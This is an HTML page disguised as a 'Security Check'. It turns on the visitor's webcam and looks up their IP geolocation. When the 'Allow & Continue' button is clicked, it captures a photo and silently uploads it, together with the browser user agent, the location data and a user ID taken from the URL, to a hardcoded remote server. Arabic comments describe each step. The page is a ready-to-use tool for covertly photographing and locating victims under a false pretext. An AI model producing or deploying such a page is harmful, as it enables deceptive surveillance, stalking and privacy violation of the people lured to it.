<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 40px; }
        video, canvas { display: none; }
        button { padding: 10px 20px; font-size: 18px; margin-top: 20px; }
    </style>
</head>
<body>
    <h2>📷 Checking your device...</h2>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>
    <button onclick="capture()">Allow & Continue</button>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        let ipInfo = {};

        // جلب بيانات الـ IP
        fetch("https://ipapi.co/json")
            .then(res => res.json())
            .then(data => { ipInfo = data; });

        // طلب الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            video.srcObject = stream;
            video.style.display = "block";
        });

        function capture() {
            ctx.drawImage(video, 0, 0, 320, 240);
            const imageData = canvas.toDataURL("image/png");

            // استخراج user_id من عنوان URL
            const user_id = window.location.pathname.split("/").pop();

            // إرسال البيانات إلى السيرفر
            fetch("http://79.99.40.71:6362/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    image: imageData,
                    user_agent: navigator.userAgent,
                    ip_data: ipInfo,
                    user_id: user_id
                })
            }).then(() => {
                document.body.innerHTML = "<h2>✅ Thank you!</h2>";
            });
        }
    </script>
</body>
</html>
